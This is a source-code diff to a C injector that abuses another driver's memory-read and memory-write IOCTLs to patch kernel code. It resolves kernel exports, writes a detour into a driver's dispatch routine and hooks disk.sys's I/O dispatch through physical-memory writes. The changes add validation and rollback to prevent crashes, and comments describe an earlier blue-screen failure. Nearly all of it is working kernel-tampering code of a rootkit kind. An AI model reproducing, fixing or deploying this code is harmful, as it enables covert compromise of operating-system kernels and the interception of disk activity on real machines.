@@ -282,13 +282,15 @@ int main(void) {
     if (!g_kbase || !g_dirbase) return 1;
 
     DWORD64 ob_ref = find_export(g_kbase, "ObReferenceObjectByName");
+    DWORD64 ob_deref = find_export(g_kbase, "ObDereferenceObject");
     DWORD64 iocpl  = find_export(g_kbase, "IoCompleteRequest");
     DWORD64 iodt   = find_export(g_kbase, "IoDriverObjectType");
     // IoDriverObjectType is a data export: find_export returns the ADDRESS of the variable.
     // ObReferenceObjectByName wants the VALUE (the POBJECT_TYPE pointer), so dereference it.
     DWORD64 iodt_val = 0;
     virt_read(iodt, &iodt_val, 8, g_dirbase);
-    flog("ob_ref=0x%llX iocpl=0x%llX iodt=0x%llX value=0x%llX", ob_ref, iocpl, iodt, iodt_val);
+    flog("ob_ref=0x%llX ob_deref=0x%llX iocpl=0x%llX iodt=0x%llX value=0x%llX", ob_ref, ob_deref, iocpl, iodt, iodt_val);
+    if (!ob_ref || !ob_deref || !iocpl || !iodt_val) { flog("export resolution failed"); return 1; }
     DWORD64 tbuf = 0; if (iodt_val) virt_read(iodt_val + 0x18, &tbuf, 8, g_dirbase);
     wchar_t tname[32] = {0}; if (tbuf) virt_read(tbuf, tname, 60, g_dirbase);
     flog("object type name = %ls", tname);
@@ -316,10 +318,12 @@ int main(void) {
     static const unsigned char p2[8] = {0x02,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
     static const unsigned char p3[8] = {0x03,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
     static const unsigned char p4[8] = {0x04,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
-    patch_slot(inst, ilen, p1, ob_ref);
-    patch_slot(inst, ilen, p2, iocpl);
-    patch_slot(inst, ilen, p3, hook_cave);
-    patch_slot(inst, ilen, p4, iodt_val);
+    static const unsigned char p5[8] = {0x05,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B,0x0B};
+    if (!patch_slot(inst, ilen, p1, ob_ref))   { flog("patch p1 (ObReferenceObjectByName) FAILED"); return 1; }
+    if (!patch_slot(inst, ilen, p2, iocpl))    { flog("patch p2 (IoCompleteRequest) FAILED"); return 1; }
+    if (!patch_slot(inst, ilen, p3, hook_cave)){ flog("patch p3 (hook cave) FAILED"); return 1; }
+    if (!patch_slot(inst, ilen, p4, iodt_val)) { flog("patch p4 (IoDriverObjectType) FAILED"); return 1; }
+    if (!patch_slot(inst, ilen, p5, ob_deref)) { flog("patch p5 (ObDereferenceObject) FAILED"); return 1; }
     flog("placeholders patched");
 
     write_kva(hook_cave, hook, hlen);
@@ -353,10 +357,31 @@ int main(void) {
     flog("detoured, triggering");
 
     BYTE dummy[0x28] = {0}, outbuf[0x20] = {0}; DWORD br = 0;
-    DeviceIoControl(g_dev, IOCTL_READ_VA, dummy, sizeof(dummy), outbuf, sizeof(outbuf), &br, NULL);
-    flog("trigger done bytes=%lu", br);
+    BOOL trig_ok = DeviceIoControl(g_dev, IOCTL_READ_VA, dummy, sizeof(dummy), outbuf, sizeof(outbuf), &br, NULL);
+    flog("trigger %s bytes=%lu", trig_ok ? "OK" : "FAILED", br);
+    if (!trig_ok || br < 8) {
+        // installer stub never ran (or failed before writing the buffer). The
+        // detour is already in place — restore chinese.sys's original dispatch
+        // NOW, otherwise every facebook-media IOCTL jumps into a half-written
+        // cave. Then abort instead of patching the hook with garbage.
+        write_kva(fb_orig_dispatch, orig_bytes, 12);
+        flog("trigger failed -> detour restored, ABORT (no BSOD this run)");
+        return 1;
+    }
     DWORD64 orig_dispatch = *(DWORD64*)outbuf;
     flog("orig dispatch = 0x%llX", orig_dispatch);
+    // CRITICAL: only accept a canonical kernel VA that is actually EXECUTABLE.
+    // Last run the installer bailed early (ObReferenceObjectByName returned
+    // STATUS_ACCESS_DENIED because DesiredAccess was 0), SystemBuffer stayed
+    // zeroed, and the injector happily patched the hook with 0x0 as the
+    // "original dispatch" -> jmp to non-executable page -> ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY -> BSOD.
+    int valid = (orig_dispatch != 0 && orig_dispatch != 0x1122334455667788ULL &&
+                 (orig_dispatch >> 40) == 0xFFFFFULL && is_exec(orig_dispatch));
+    if (!valid) {
+        flog("orig dispatch INVALID (exec=%s) -> restoring detour, NOT patching hook", is_exec(orig_dispatch) ? "YES" : "NO");
+        write_kva(fb_orig_dispatch, orig_bytes, 12);
+        return 1;
+    }
     BYTE ob[16] = {0};
     virt_read(orig_dispatch, ob, 16, g_dirbase);
     flog("orig bytes: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
@@ -375,6 +400,8 @@ int main(void) {
         flog("MajorFunction[0..3] = %llX %llX %llX %llX", mf[0], mf[1], mf[2], mf[3]);
         DWORD64 mf14 = 0; virt_read(drobj + 0xE0, &mf14, 8, g_dirbase);
         flog("MajorFunction[14] = 0x%llX  exec=%s", mf14, is_exec(mf14) ? "YES" : "NO");
+        // The installer stub took a reference on the driver object and now
+        // always dereferences it itself — nothing to clean up here.
     }
     DWORD64 dsz = 0; DWORD64 dbase = get_module("disk.sys", &dsz);
     flog("disk.sys base=0x%llX size=0x%llX", dbase, dsz);
@@ -385,13 +412,13 @@ int main(void) {
     if (mbase) flog("orig dispatch offset in module: +0x%llX", orig_dispatch - mbase);
     // patch the hook's imm64 placeholder with the original disk.sys dispatch (usermode
     // phys_write, no CR0.WP). the hook now calls the real handler on the next disk I/O.
-    if (orig_dispatch && orig_dispatch != 0x1122334455667788ULL) {
-        if (phys_write(va_to_pa(hook_cave + 0x02), &orig_dispatch, 8))
-            flog("hook placeholder patched");
-        else
-            flog("hook placeholder patch FAILED");
-    } else {
-        flog("no original dispatch returned (\\Driver\\Disk not resolved)");
+    // orig_dispatch was already validated (canonical kernel VA + executable) above.
+    if (phys_write(va_to_pa(hook_cave + 0x02), &orig_dispatch, 8))
+        flog("hook placeholder patched");
+    else {
+        flog("hook placeholder patch FAILED -> restoring detour, NOT leaving unpatched hook installed");
+        write_kva(fb_orig_dispatch, orig_bytes, 12);
+        return 1;
     }
 
     write_kva(fb_orig_dispatch, orig_bytes, 12);
